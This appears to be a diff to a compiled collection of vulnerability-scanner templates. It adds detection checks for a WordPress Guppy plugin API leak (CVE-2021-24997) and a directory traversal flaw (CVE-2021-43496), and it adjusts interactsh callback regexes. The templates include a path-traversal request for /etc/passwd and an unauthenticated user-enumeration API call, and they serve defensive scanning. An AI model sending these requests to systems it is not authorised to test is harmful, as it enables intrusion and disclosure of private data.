@@ -34968,6 +34968,52 @@
       ]
     },
     {
+      "id": "CVE-2021-24997",
+      "info": {
+        "author": "Evan Rubinstein",
+        "classification": {
+          "cve-id": "CVE-2021-24997",
+          "cvss-score": 5.4,
+          "cwe-id": "CWE-200"
+        },
+        "description": "Instances of the Guppy Wordpress extension up to 1.1 are vulnerable to an API disclosure vulnerability which allows remote unauthenticated attackrs to obtain all user IDs, and then use that information to make API requests to either get messages sent between users, or send messages posing as one user to another.",
+        "name": "CVE-2021-24997",
+        "reference": [
+          "https://www.exploit-db.com/exploits/50540",
+          "https://patchstack.com/database/vulnerability/wp-guppy/wordpress-wp-guppy-plugin-1-2-sensitive-information-disclosure-vulnerability",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-24997"
+        ],
+        "tags": "wordpress,guppy,api,cve2021,cve,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"guppyUsers\":",
+                "\"userId\":",
+                "\"type\":"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": null,
+          "path": [
+            "{{BaseURL}}/wp-json/guppy/v2/load-guppy-users?userId=1&offset=0&search="
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-25281",
       "info": {
         "author": "madrobot",
@@ -41087,6 +41133,43 @@
       ]
     },
     {
+      "id": "CVE-2021-43496",
+      "info": {
+        "author": "Evan Rubinstein",
+        "classification": {
+          "cve-id": "CVE-2021-43496",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Clustering master branch as of commit 53e663e259bcfc8cdecb56c0bb255bd70bfcaa70 is affected by a directory traversal vulnerability. This attack can cause the disclosure of critical secrets stored anywhere on the system and can significantly aid in getting remote code access.",
+        "name": "Clustering LFI",
+        "reference": [
+          "https://github.com/varun-suresh/Clustering/issues/12",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-43496"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2021,lfi,clustering"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/img/../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-43778",
       "info": {
         "author": "cckuailong",
@@ -41192,7 +41275,7 @@
               "group": 1,
               "part": "interactsh_request",
               "regex": [
-                "([a-z0-9\\.\\-]+)\\.([a-z0-9]+)\\.interactsh\\.com"
+                "([a-z0-9\\.\\-]+)\\.([a-z0-9]+)\\.([a-z0-9]+)\\.\\w+"
               ],
               "type": "regex"
             }
@@ -41208,7 +41291,7 @@
             {
               "part": "interactsh_request",
               "regex": [
-                "([a-z0-9\\.\\-]+)\\.([a-z0-9]+)\\.interactsh\\.com"
+                "([a-z0-9\\.\\-]+)\\.([a-z0-9]+)\\.([a-z0-9]+)\\.\\w+"
               ],
               "type": "regex"
             }
